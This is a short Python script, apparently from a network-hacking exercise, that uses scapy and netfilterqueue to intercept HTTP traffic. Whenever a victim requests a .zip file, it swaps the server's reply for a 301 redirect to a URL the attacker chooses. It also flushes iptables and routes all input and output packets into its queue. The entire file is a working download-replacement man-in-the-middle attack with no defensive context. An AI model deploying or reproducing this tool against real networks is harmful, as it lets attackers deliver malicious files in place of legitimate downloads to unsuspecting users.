import scapy.all as scapy
import netfilterqueue
import subprocess


subprocess.run("iptables --flush", check=True, shell=True)
# subprocess.run("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0", check=True, shell=True)
subprocess.run("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0", check=True, shell=True)
subprocess.run("sudo iptables -I INPUT -j NFQUEUE --queue-num 0", check=True, shell=True)


ack_list = []


def set_url(packet, url):
        packet[scapy.Raw].load = f"HTTP/1.1 301 Moved Permanently\nLocation: {url}\n\n"
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum
        return packet


def process_packet(packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
            if scapy_packet[scapy.TCP].dport == 80:
                if ".zip" in str(scapy_packet[scapy.Raw].load): # Replace file extension to one of your choice
                    print("Exe file found -->> \n")
                    ack_list.append(scapy_packet[scapy.TCP].ack)

            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+] Replacing file =>>")
                    modified_packet = set_url(scapy_packet, "\nhttp://www.example.com")
                    packet.set_payload(bytes(modified_packet))

        packet.accept()
    

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
